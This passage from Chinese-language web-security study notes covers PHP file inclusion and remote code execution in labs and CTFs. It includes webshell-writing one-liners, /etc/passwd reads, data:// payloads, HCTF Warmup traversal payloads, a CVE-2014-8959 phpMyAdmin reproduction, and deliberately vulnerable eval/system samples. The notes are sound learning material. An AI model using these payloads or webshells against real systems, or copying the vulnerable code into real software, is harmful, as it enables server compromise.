<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><p>访问本地文件系统，所有语言都支持，file协议需要传入绝对路径（完整路径）。</p>
<p>读取windows文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">//D:/a.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=file://D:/a.txt">http://127.0.0.1?file=file://D:/a.txt</a></p>
<p>读取linux文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=file:///etc/passwd">http://127.0.0.1?file=file:///etc/passwd</a></p>
<h5 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h5><p>读取数据流</p>
<ul>
<li><p>allow_url_fopen ：on</p>
</li>
<li><p>allow_url_include：on</p>
</li>
</ul>
<p>执行php代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">data://text/plaindata://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token operator">%</span><span class="token number">20</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>eg:<a target="_blank" rel="noopener" href="http://127.0.0.1/?file=data://text/plaindata://text/plain">http://127.0.0.1?file=data://text/plaindata://text/plain</a>,<?php%20phpinfo()?></p>
<p>以base64的形式，执行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   base64编码=>  PD9waHAgcGhwaW5mbygpPz4=
    
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>eg:<a target="_blank" rel="noopener" href="http://127.0.0.1/?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
<h3 id="实例练习"><a href="#实例练习" class="headerlink" title="实例练习"></a>实例练习</h3><h4 id="DVWA靶场File-Inclusion"><a href="#DVWA靶场File-Inclusion" class="headerlink" title="DVWA靶场File Inclusion"></a>DVWA靶场File Inclusion</h4><ul>
<li>allow_url_fopen:on</li>
<li>allow_url_include:on</li>
</ul>
<p>靶场为安装，待定</p>
<h4 id="ACTF2020-Include"><a href="#ACTF2020-Include" class="headerlink" title="ACTF2020 Include"></a>ACTF2020 Include</h4><p>使用php协议中的php://filter协议读取网页源码，解码base64,找到被注释的flag</p>
<p><img src="/2023/012220963/105.PNG" alt="105"></p>
<h4 id="HCTF-2018-Warmup-暂未做"><a href="#HCTF-2018-Warmup-暂未做" class="headerlink" title="HCTF-2018-Warmup(暂未做)"></a>HCTF-2018-Warmup(暂未做)</h4><p>代码审计</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>
   <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
       <span class="token punctuation">&#123;</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
           <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$_page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
           <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
   <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" 
/>"</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>  
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>主要判断：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$page</span>不为空并且为字符串
<span class="token variable">$page</span>在白名单中，直接返回<span class="token constant boolean">true</span>
处理过的<span class="token variable">$_page</span>在白名单中，直接返回<span class="token constant boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>主要代码分析：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
    <span class="token variable">$page</span><span class="token punctuation">,</span>
    <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># mb_strpos($page . '?', '?') 查找字符串第一次出现?的位置</span>
<span class="token comment"># mb_substr 从字符串中截取部分，截取字符串开始至第一次出现?的部分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token operator">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>经过mb_substr函数处理过的结果：source.php</p>
<p>最终include文件 source.php?/../../../../ffffllllaaaagggg</p>
<p>payload2:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">253</span>F<span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="CVE-2014-8959-phpMyAdmin任意文件包含"><a href="#CVE-2014-8959-phpMyAdmin任意文件包含" class="headerlink" title="CVE-2014-8959 phpMyAdmin任意文件包含"></a>CVE-2014-8959 phpMyAdmin任意文件包含</h4><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
<p>漏洞利用有两个前提：</p>
<ol>
<li><p>能登陆phpMyAdmin，满足phpmyadmin的安全检查</p>
</li>
<li><p>需要截断，需要满足下面的要求之一</p>
<ul>
<li><p>PHP的版本需要小于 5.3.4 且gpc关闭</p>
</li>
<li><p>利用长文件名截断</p>
</li>
</ul>
</li>
</ol>
<p>环境：vulfocus/phpmyadmin-cve_2014_8959:latest</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull vulfocus&#x2F;phpmyadmin-cve_2014_8959:latest

docker run -d -p 8080:80 vulfocus&#x2F;phpmyadmin-cve_2014_8959:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>漏洞复现：</strong></p>
<p>测试账号：pmatest:pmatest</p>
<p>漏洞url:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//&lt;IP>/pma/gis_data_editor.php?</span>
token<span class="token operator">=</span>effa7667f41b469bde9c43d6e814f9a4<span class="token operator">&amp;&amp;</span>gis_data<span class="token punctuation">[</span>gis_type<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token number">1.</span>gif<span class="token operator">%</span><span class="token number">00</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>phpMyAdmin地址：<a href="http://ip:port/pma">http://ip:port/pma</a></p>
<p>1、token可以在登录后在url中获取</p>
<p>2、访问的同时post参数 a=phpinfo(); // 任意php代码</p>
<p><img src="/2023/012220963/106.PNG" alt="106"></p>
<p>(hacker 有问题，没测试post传参)</p>
<p><strong>注：</strong>此漏洞可以实现任意文件包含</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
<li>固定引用文件的扩展名</li>
<li>固定引用文件的名称</li>
<li>WAF</li>
</ul>
<h2 id="RCE代码-amp-命令执行漏洞"><a href="#RCE代码-amp-命令执行漏洞" class="headerlink" title="RCE代码&amp;命令执行漏洞"></a>RCE代码&amp;命令执行漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>RCE：<strong>Remote Command/Code Execute</strong>，远程代码/命令执行。</p>
<p>在Web应用中有时候程序员会使用代码调用代码或调用系统命令。</p>
<p>如果应用在执行以上操作时，没有考虑用户是否能控制这个字符串的话，将造成代码执行漏洞或者命令执行漏洞</p>
<h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>代码执行危害：根据服务器语言不同，可导致PHP、Java、Python等任意代码执行</p>
<p>命令执行危害：导致任意<strong>系统命令</strong>执行（getshell）</p>
<h4 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h4><p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>eval($c)：eval函数会把$c当做php代码执行。</p>
<p>访问： <a target="_blank" rel="noopener" href="http://127.0.0.1/?c=phpinfo()">http://127.0.0.1?c=phpinfo()</a>; <strong>注意带分号</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用代码执行去写入一个木马文件：</p>
<p>写入木马的代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">fputs(fopen('a.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1?c=fputs(fopen('a.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>system($c)：system函数会把$c当做系统命令执行。</p>
<p>访问：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?c=ipconfig">http://127.0.0.1/?c=ipconfig</a></p>
<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><ul>
<li>用户可控变量</li>
<li>漏洞函数</li>
</ul>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>怎么找RCE：根据网站应用不同来查找</p>
<ul>
<li><p>白盒测试：</p>
<ul>
<li>代码审计</li>
</ul>
</li>
<li><p>黑盒测试：</p>
<ul>
<li><p>漏扫工具</p>
</li>
<li><p>nday漏洞</p>
</li>
<li><p>手动测试</p>
</li>
</ul>
</li>
</ul>
<h3 id="RCE危险函数"><a href="#RCE危险函数" class="headerlink" title="RCE危险函数"></a>RCE危险函数</h3><p>php中命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</p>
<p>php中代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p>system — 执行外部程序，并且显示输出</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p>exec — 执行一个外部程序</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h5><p>popen — 打开进程文件指针</p>
<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// $r = popen("ping 127.0.0.1","r");</span>
<span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p>passthru — 执行外部程序并且显示原始输出</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h5><p>pcntl_exec — 在当前进程空间执行指定程序</p>
<p>Linux中常用，可以用于反弹shell</p>
<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><p>把字符串作为PHP代码执行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('whoami');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h5><p>PHP5：<strong>assert</strong>(mixed $assertion , string $description = ?): bool</p>
<p>PHP7：<strong>assert</strong>(mixed $assertion , Throwable $exception = ?): bool</p>
<p>assert — 检查一个断言是否为 false</p>
<p>如果 assertion 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('ipconfig');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h5><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"(.*)"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="creat-function"><a href="#creat-function" class="headerlink" title="creat_function()"></a>creat_function()</h5><p>create_function — 创建一个匿名函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$newfunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return system($a);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$newfunc</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h5><p>array_map — 为数组的每个元素应用回调函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
<span class="token variable">$array</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ipconfig'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h5><p>call_user_func — 把第一个参数作为回调函数调用</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
